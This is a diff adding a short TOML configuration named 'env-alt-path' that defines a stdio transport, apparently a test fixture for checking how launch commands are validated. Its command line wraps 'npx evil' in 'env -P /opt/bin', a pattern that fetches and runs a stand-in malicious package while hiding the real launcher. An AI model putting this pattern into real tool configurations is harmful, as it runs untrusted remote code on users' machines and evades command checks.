@@ -1,0 +1,6 @@
+name = "env-alt-path"
+
+[transport]
+type = "stdio"
+command = "env"
+args = ["-P", "/opt/bin", "npx", "evil"]
